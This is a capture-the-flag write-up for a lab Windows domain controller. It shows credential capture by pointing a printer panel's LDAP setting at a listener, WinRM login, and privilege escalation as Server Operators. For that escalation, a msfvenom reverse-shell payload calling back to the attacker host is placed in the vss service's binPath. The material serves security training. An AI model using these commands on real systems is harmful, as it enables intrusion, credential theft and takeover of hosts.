Target : 10.129.95.241

Date : 28/05/2026

```bash
>  echo "10.129.95.241 return.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.95.241 return.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 10.129.95.241  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 07:52 +0200  
Nmap scan report for return.htb (10.129.95.241)  
Host is up (0.095s latency).  
Not shown: 65509 closed tcp ports (reset)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: HTB Printer Admin Panel  
| http-methods:    
|_  Potentially risky methods: TRACE  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-28 06:12:00Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp  open  mc-nmf        .NET Message Framing  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
49664/tcp open  msrpc         Microsoft Windows RPC  
49665/tcp open  msrpc         Microsoft Windows RPC  
49666/tcp open  msrpc         Microsoft Windows RPC  
49668/tcp open  msrpc         Microsoft Windows RPC  
49671/tcp open  msrpc         Microsoft Windows RPC  
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49675/tcp open  msrpc         Microsoft Windows RPC  
49678/tcp open  msrpc         Microsoft Windows RPC  
49681/tcp open  msrpc         Microsoft Windows RPC  
49697/tcp open  msrpc         Microsoft Windows RPC  
53633/tcp open  msrpc         Microsoft Windows RPC  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.99%E=4%D=5/28%OT=53%CT=1%CU=38095%PV=Y%DS=2%DC=I%G=Y%TM=6A17D8A  
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=RI%II=I%SS=S%TS  
OS:=U)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=RI%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%I  
OS:SR=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=109%GCD=1%ISR=10A%TI=I%CI=I%II=I%  
OS:SS=S%TS=U)SEQ(SP=109%GCD=1%ISR=10C%TI=I%CI=RI%II=I%SS=S%TS=U)OPS(O1=M552  
OS:NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)W  
OS:IN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=F  
OS:FFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T  
OS:3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S  
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R  
OS:=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=  
OS:Y%DFI=N%T=80%CD=Z)  
  
Network Distance: 2 hops  
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
|_clock-skew: 18m37s  
| smb2-time:    
|   date: 2026-05-28T06:13:10
```

Looks like classic Active Directory with ports `80/tcp`, `5985/tcp` and `47001/tcp` http as well as `9389/tcp` mc-nmf .NET Message Framing.
It has RPC all over the place including over http on port `49674/tcp` and `DNS`on port `53/tcp` then the usual suspects : LDAP on ports `3268/tcp` and `389/tcp`, netbios on port `139/tcp` and kerberos on port `88/tcp` with smb2 3.1.1 on port `445/tcp`.

```bash
>  nxc smb 10.129.95.241 -u guest -p '' --shares  
SMB         10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.95.241   445    PRINTER          [-] return.local\guest: STATUS_ACCOUNT_DISABLED
```

So the guest user is disabled on SMB.

The only share is 'PRINTER' and since http `tcp/80` is open, we go on the target website, it's an Admin Printer Panel. So we start a listener on LDAP :

```bash
sudo nc -lvnp 389
```

And we open `http://return.htb`, then go to the settings page `http://return.htb/settings.php` and change the server address from `printer.return.local` to our tun VPN (from `ip get route 10.129.95.241`) 

We then receive credentials on the listener :

```bash
Connection received on 10.129.95.241 60325  
0*`%return\svc-printer 
                      1edFg43012!!
```

We then try the credentials with nxc again :

```bash
>  nxc smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' --shares --users --groups  
SMB         10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!!    
SMB         10.129.95.241   445    PRINTER          [*] Enumerated shares  
SMB         10.129.95.241   445    PRINTER          Share           Permissions     Remark  
SMB         10.129.95.241   445    PRINTER          -----           -----------     ------  
SMB         10.129.95.241   445    PRINTER          ADMIN$          READ            Remote Admin  
SMB         10.129.95.241   445    PRINTER          C$              READ,WRITE      Default share  
SMB         10.129.95.241   445    PRINTER          IPC$            READ            Remote IPC  
SMB         10.129.95.241   445    PRINTER          NETLOGON        READ            Logon server share    
SMB         10.129.95.241   445    PRINTER          SYSVOL          READ            Logon server share    
SMB         10.129.95.241   445    PRINTER          -Username-                    -Last PW Set-       -BadPW- -Description-                                                  
SMB         10.129.95.241   445    PRINTER          Administrator                 2021-07-16 15:03:22 0       Built-in account for administering the computer/domain    
SMB         10.129.95.241   445    PRINTER          Guest                         <never>             0       Built-in account for guest access to the computer/domain    
SMB         10.129.95.241   445    PRINTER          krbtgt                        2021-05-20 13:26:54 0       Key Distribution Center Service Account    
SMB         10.129.95.241   445    PRINTER          svc-printer                   2021-05-26 08:15:13 0       Service Account for Printer    
SMB         10.129.95.241   445    PRINTER          [*] Enumerated 4 local users: RETURN  
SMB         10.129.95.241   445    PRINTER          [-] [REMOVED] Arg moved to the ldap protocol
```

We see we have `READ, WRITE` privileges on the Default Share and `READ` privileges on SYSVOL, NETLOGON, and ADMIN$.

```bash
>  nxc winrm 10.129.95.241 -u svc-printer -p '1edFg43012!!'  
WINRM       10.129.95.241   5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)    
WINRM       10.129.95.241   5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

We also have access to winrm.

```bash
>  smbclient //10.129.234.66/ADMIN$ -U svc-printer  
Password for [WORKGROUP\svc-printer]:  
tree connect failed: NT_STATUS_ACCESS_DENIED

>  smbclient //10.129.234.66/NETLOGON -U svc-printer  
Password for [WORKGROUP\svc-printer]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
NT_STATUS_ACCESS_DENIED listing \*
```

So we don't actually have that much access to SMB shares.

We'll try using `evil-winrm` to get a shell :

```PowerShell
>  evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\svc-printer\Documents> type /Users/svc-printer/Desktop/user.txt  
d36c6666ae0e84663917e2c976162d07
```

And we got the User flag.

Then, we check our privileges as svc-printer :

```PowerShell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                         State  
============================= =================================== =======  
SeMachineAccountPrivilege     Add workstations to domain          Enabled  
SeLoadDriverPrivilege         Load and unload device drivers      Enabled  
SeSystemtimePrivilege         Change the system time              Enabled  
SeBackupPrivilege             Back up files and directories       Enabled  
SeRestorePrivilege            Restore files and directories       Enabled  
SeShutdownPrivilege           Shut down the system                Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled  
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled  
SeTimeZonePrivilege           Change the time zone                Enabled
```

We can see that we have `SeRestorePrivilege Restore files and directories` as well as `SeChangeNotify Privilege Bypass traverse checking`.

```PowerShell
*Evil-WinRM* PS C:\> dir  
  
  
   Directory: C:\  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----        5/20/2021   7:19 AM                inetpub  
d-----        9/15/2018  12:19 AM                PerfLogs  
d-r---        9/27/2021   4:46 AM                Program Files  
d-----        5/26/2021   2:57 AM                Program Files (x86)  
d-r---        5/26/2021   1:51 AM                Users  
d-----        9/27/2021   4:49 AM                Windows

*Evil-WinRM* PS C:\Program Files (x86)> dir -force  
  
  
   Directory: C:\Program Files (x86)  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----        9/15/2018  12:28 AM                Common Files  
d-----        9/15/2018   2:06 AM                Internet Explorer  
d-----        9/15/2018  12:19 AM                Microsoft.NET  
d-----        5/26/2021   2:57 AM                PHP Manager for IIS  
d-----        9/15/2018   2:05 AM                Windows Defender  
d-----        9/15/2018  12:19 AM                Windows Mail  
d-----       10/29/2018   3:39 PM                Windows Media Player  
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform  
d-----        9/15/2018  12:28 AM                windows nt  
d-----       10/29/2018   3:39 PM                Windows Photo Viewer  
d-----        9/15/2018  12:19 AM                Windows Portable Devices  
d--hs-        9/15/2018  12:19 AM                Windows Sidebar  
d-----        9/15/2018  12:19 AM                WindowsPowerShell  
-a-hs-        9/15/2018  12:16 AM            174 desktop.ini

*Evil-WinRM* PS C:\Program Files (x86)> type desktop.ini  
  
[.ShellClassInfo]  
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21817
```

We'll use msfvenom to create a payload and use meterpreter as a listener :

```bash
>  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o payload.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x64 from the payload  
No encoder specified, outputting raw payload  
Payload size: 509 bytes  
Final size of exe file: 7680 bytes  
Saved as: payload.exe

>  msfconsole -q  
msf > use exploit/multi/handler  
[*] Using configured payload generic/shell_reverse_tcp  
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp  
payload => windows/x64/meterpreter/reverse_tcp  
msf exploit(multi/handler) > set LHOST 4444  
LHOST => 4444  
msf exploit(multi/handler) > set LPORT 4444  
LPORT => 4444  
msf exploit(multi/handler) > set LHOST 10.10.14.12  
LHOST => 10.10.14.12  
msf exploit(multi/handler) > run  
[*] Started reverse TCP handler on 10.10.14.12:4444
```

Next, I'll have to upload the payload.exe I created using msfvenom.

I check the group privileges I have as `svc-printer` back on the shell :

```bash
*Evil-WinRM* PS C:\> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                 Type             SID          Attributes  
========================================== ================ ============ ==================================================  
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
```

We can see we are `Server Operators`.

That means we can use the `sc.exe` (Windows Service Control) to check the configuration of the `vss` (Volume Shadow Copy) :

```PowerShell
*Evil-WinRM* PS C:\> sc.exe qc vss  
[SC] QueryServiceConfig SUCCESS  
  
SERVICE_NAME: vss  
       TYPE               : 10  WIN32_OWN_PROCESS  
       START_TYPE         : 3   DEMAND_START  
       ERROR_CONTROL      : 1   NORMAL  
       BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe  
       LOAD_ORDER_GROUP   :  
       TAG                : 0  
       DISPLAY_NAME       : Volume Shadow Copy  
       DEPENDENCIES       : RPCSS  
       SERVICE_START_NAME : LocalSystem
```

We can see that it runs as `NT AUTHORITY\SYSTEM` by the `SERVICE_START_NAME : LocalSystem` line.

Since our `meterpreter` is still listening on port 4444, we'll use port 9001 :

```bash
>  nc -lvnp 9001  
Listening on 0.0.0.0 9001
```

```PowerShell
*Evil-WinRM* PS C:\> upload /usr/share/windows/windows-binaries/nc.exe C:\ProgramData\nc.exe  
                                          
Info: Uploading /usr/share/windows/windows-binaries/nc.exe to C:\\C:ProgramDatanc.exe  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Data: 79188 bytes of 79188 bytes copied  
```

We tested a copy of nc.exe, now we can copy the payload directly into the machine and use it for PrivEsc :

```PowerShell                                       
*Evil-WinRM* PS C:\> upload ./payload.exe C:\ProgramData\payload.exe  
                                          
Info: Uploading /home/vagabond/payload.exe to C:\\C:ProgramDatapayload.exe  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Data: 10240 bytes of 10240 bytes copied  
                                          
Info: Upload successful!
```

Since `vss` runs as `NT AUTHORITY\SYSTEM` we'll use the Service Control `sc.exe` to modify the configuration of that file with our payload.

```PowerShell
*Evil-WinRM* PS C:\> sc.exe config vss binPath= "C:\ProgramData\payload.exe"  
[SC] ChangeServiceConfig SUCCESS
```

However when we check the path of upload, we see it's been uploaded to `C:ProgramDatapayload.exe` :

```PowerShell
*Evil-WinRM* PS C:\> upload ./payload.exe C:\ProgramData\payload.exe  
                                          
Info: Uploading /home/vagabond/payload.exe to C:\\C:ProgramDatapayload.exe  
```

So we'll use double slashes after `ProgramData` and re-modify the configuration :

```PowerShell
*Evil-WinRM* PS C:\> upload ./payload.exe C:\ProgramData\\payload.exe  
                                          
Info: Uploading /home/vagabond/payload.exe to C:\\C:ProgramData\payload.exe  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Data: 10240 bytes of 10240 bytes copied
```

Another error, it uploaded at `C:\\C:ProgramData\payload.exe` so we remove the C:\ and keep the double backslashes :

```PowerShell
*Evil-WinRM* PS C:\> upload ./payload.exe \ProgramData\\payload.exe  
                                          
Info: Uploading /home/vagabond/payload.exe to C:\\ProgramData\payload.exe  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Data: 10240 bytes of 10240 bytes copied  
                                          
Info: Upload successful!  
*Evil-WinRM* PS C:\> dir C:\ProgramData\payload.exe  
  
  
   Directory: C:\ProgramData  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
-a----        5/28/2026   1:09 AM           7680 payload.exe
```

Then, we'll update the configuration again :

```PowerShell
*Evil-WinRM* PS C:\> sc.exe config vss binPath= "C:\ProgramData\payload.exe"  
[SC] ChangeServiceConfig SUCCESS  
*Evil-WinRM* PS C:\> sc.exe stop vss  
[SC] ControlService FAILED 1062:  
  
The service has not been started.  
  
*Evil-WinRM* PS C:\> sc.exe start vss
```

The meterpreter session listening on 4444 died after 5 seconds, 3 times in a row :

```bash
> meterpreter shell
C:\Windows\system32>cd /Users  
[*] 10.129.95.241 - Meterpreter session 3 closed.  Reason: Died
```

We try on listener 9001, and the same happens :

```PowerShell
*Evil-WinRM* PS C:\> sc.exe start vss  
[SC] StartService FAILED 1053:  
  
The service did not respond to the start or control request in a timely fashion.
```

So we modify the configuration file to give us root under the five second timeframe :

```PowerShell
>  nc -lvnp 9001  
Listening on 0.0.0.0 9001  
Connection received on 10.129.95.241 56230  
Microsoft Windows [Version 10.0.17763.107]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt > C:\ProgramData\root.txt  
type C:\Users\Administrator\Desktop\root.txt > C:\ProgramData\root.txt  
  
C:\Windows\system32>type C:\ProgramData\root.txt  
type C:\ProgramData\root.txt  
342f7c8bfb391d273bb874de0ca47077
```

And we got the root flag.
